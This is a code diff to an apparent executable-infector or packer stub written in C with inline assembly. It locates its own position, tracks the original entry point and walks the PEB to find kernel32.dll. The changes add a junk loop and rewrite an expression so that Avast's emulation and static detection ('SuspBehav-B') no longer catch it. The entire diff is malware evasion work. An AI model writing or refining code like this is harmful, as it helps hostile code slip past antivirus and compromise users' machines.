@@ -150,9 +150,13 @@ char * _needed_strings[] = {
 #pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
 
 int __stdcall NewEntryPoint()
-{
+{	
 	DWORD dwCurrentAddr = 0;
 	DWORD OEP = 0;
+	
+	// bypass AVAST emulation (SuspBehav-B static detection)
+	for (int i = 0; i < 1000; i+=4)
+		i -= 2;
 	
 	// Get current EIP in dwCurrentAddr
 	__asm {
@@ -160,7 +164,7 @@ int __stdcall NewEntryPoint()
 	lbl_ref1:
 		pop dwCurrentAddr
 	}
-	
+
 	// *** Find the ending marker of data section <E> 
 	DWORD dwMagic = 0;
 	while ( dwMagic != 0x003E453C )
@@ -189,14 +193,15 @@ int __stdcall NewEntryPoint()
 	DWORD *Ldr;
 	
 	__asm {
-		mov eax,30h
+		mov eax, 30h
 		mov eax,DWORD PTR fs:[eax]
-		add eax, 08h
+		add eax, 08h	// get the 2nd entry (kernel32.dll)
 		mov ss:[pPEB], eax
 	}
 	
 	Ldr = *(pPEB + 1);
-	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
+	// AVAST detect this!!
+	head = ((PEB_LIST_ENTRY *) *(Ldr + 3));
 	
 	PEB_LIST_ENTRY* entry = head;
 	do {		
